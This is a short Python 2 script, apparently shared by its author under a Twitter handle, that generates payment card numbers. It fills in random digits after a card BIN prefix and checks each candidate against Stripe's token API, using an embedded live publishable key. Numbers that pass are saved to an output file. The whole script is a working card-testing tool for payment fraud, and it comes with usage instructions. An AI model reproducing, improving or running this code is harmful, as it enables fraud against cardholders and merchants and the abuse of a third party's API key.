#!/usr/bin/python
#Twitter: https://twitter.com/KendoClaw1

from random import randint
import re
import requests
import argparse
from sys import argv

print """
########################
#                      #
#   Bins Generator     #
#                      #
#   By: KendoClaw1     #
#                      #
########################
"""
print "To stop the script Press CTRL + C"


parser = argparse.ArgumentParser(description="Bins Generator by KendoClaw1")
parser.add_argument('-b',help="The bin to generate CC's",metavar="BIN")
parser.add_argument('-n',help="Number of Bins to generate (Default = 50)")
parser.add_argument('-o',help="Output file",metavar="result.txt")
args = parser.parse_args()


def checkbin(bintocheck):
	params = {"card[number]":bintocheck,"card[exp_month]":06,"card[exp_year]":19,"card[cvc]":randint(111,999),"key":"pk_live_weS6QNEUbI0gccxqP9IBDa7h","_method":"POST"}
	headers = {"Host":"api.stripe.com","Connection":"Closed:"}
	req = requests.get("https://api.stripe.com/v1/tokens",params=params,headers=headers)
	return req.status_code


def main():
	bins = 0
	while bins != howmanybins:
		replaced = re.sub('x', lambda x: str(randint(0,9)), bincode)
		if checkbin(replaced) == 200:
			print replaced
			filetosave.write(replaced)
			filetosave.write("\n")
			bins += 1


			
try:
	bincode = args.b.lower()
	if args.n:
		howmanybins =  args.n
	else:
		howmanybins = 5
	filetosave = open(args.o,'a')
	main()
except KeyboardInterrupt:
	print "\nBins saved to "+args.o+" :)"
except IndexError:
	print "ERROR: missing argument\nUsage example: python "+argv[0]+" 530072XXXXXXXXXX 10 result.txt "
except AttributeError:
	print "ERROR: Please provide a bin using -b"
except TypeError:
	print "ERROR: Please provide a file to save using -o"
